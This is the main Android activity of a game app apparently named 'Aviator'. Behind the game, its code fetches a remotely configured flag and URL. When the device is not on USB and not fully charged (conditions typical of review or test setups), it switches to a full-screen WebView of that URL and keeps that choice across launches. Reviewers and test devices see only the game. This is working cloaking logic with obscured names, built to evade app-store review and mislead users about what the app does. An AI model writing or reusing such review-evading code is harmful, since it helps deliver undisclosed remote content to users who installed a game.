package aviator.original.fly

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import aviator.original.fly.databinding.ActivityMainBinding
import aviator.original.fly.util.DataStoreManager
import aviator.original.fly.util.Lottie
import aviator.original.fly.util.Once
import aviator.original.fly.util.getBatteryPercentage
import aviator.original.fly.util.internetConnection
import aviator.original.fly.util.isBatteryCharging
import aviator.original.fly.util.isUSB
import aviator.original.fly.util.log
import aviator.original.fly.webView.WebViewFragment
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.firebase.Firebase
import com.google.firebase.FirebaseApp
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val IdIsHkA = 357
        var urulasa       = ""

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebViewFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataStore()
//            startFragmentID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        IdIsHkA             -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else                -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.teleport)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "TELEPORTACIA" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        urulasa = it
                        startFragmentID.emit(IdIsHkA)
                    }
                }
                "DEveloperScin" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getServerData()
                }
            }
        }
    }

    private fun getServerData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = JSONObject(getString("dropped"))
                        log("success = $jsonData")

                        val come  = jsonData.getString("come")
                        val knife = jsonData.getString("knife")

                        lookParamsFor(come, knife)
                    } else {
                        startFragmentID.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun lookParamsFor(come: String, knife: String) {
        if (come=="true") {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                openDev()
            } else {
                openWep(knife)
            }
        } else {
            openDev()
        }
    }

    private fun openDev() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "DEveloperScin" }
            startFragmentID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openWep(knife: String) {
        urulasa = knife
        startFragmentID.tryEmit(IdIsHkA)

        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "TELEPORTACIA" }
            DataStoreManager.Link.update { urulasa }
        }
    }

}